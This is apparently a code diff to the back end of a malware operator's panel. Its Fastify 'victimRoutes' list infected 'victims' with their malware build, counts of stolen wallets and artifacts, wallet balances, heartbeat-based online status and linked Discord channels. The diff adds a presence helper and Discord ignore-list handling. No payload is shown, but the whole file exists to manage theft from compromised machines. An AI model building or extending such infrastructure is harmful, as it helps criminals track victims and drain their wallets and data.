@@ -8,6 +8,7 @@ import { audit } from '../lib/audit';
 import { notFound } from '../lib/errors';
 import { requireRole } from '../plugins/auth';
 import { artifactDir, safeRel } from '../services/artifact';
+import { isOnline } from '../lib/presence';
 import { publish } from '../lib/bus';
 
 const listQuery = z.object({
@@ -52,13 +53,14 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       take: query.limit,
       include: {
         build: { select: { name: true, version: true } },
+        discord: { select: { channelId: true, missingAt: true } },
         _count: { select: { wallets: true, artifacts: true } }
       }
     });
     return {
       items: rows.map((row) => ({
         ...row,
-        online: Date.now() - row.lastHeartbeatAt.getTime() < 90_000,
+        online: isOnline(row.lastHeartbeatAt, row.lastAgentMessageAt),
         wallets: row._count.wallets,
         artifacts: row._count.artifacts,
         _count: undefined
@@ -117,11 +119,15 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
     });
     if (!victim) throw notFound('victim');
     const balanceCount = await prisma.wallet.count({ where: { victimId: id, NOT: { balance: null } } });
+    const ignored = victim.discord
+      ? await prisma.discordIgnore.findUnique({ where: { channelId: victim.discord.channelId } })
+      : null;
     return {
       ...victim,
       discordChannel: victim.discord?.channelId ?? null,
       discordMissingAt: victim.discord?.missingAt ?? null,
-      online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000,
+      discordIgnored: Boolean(ignored),
+      online: isOnline(victim.lastHeartbeatAt, victim.lastAgentMessageAt),
       balances: balanceCount
     };
   });
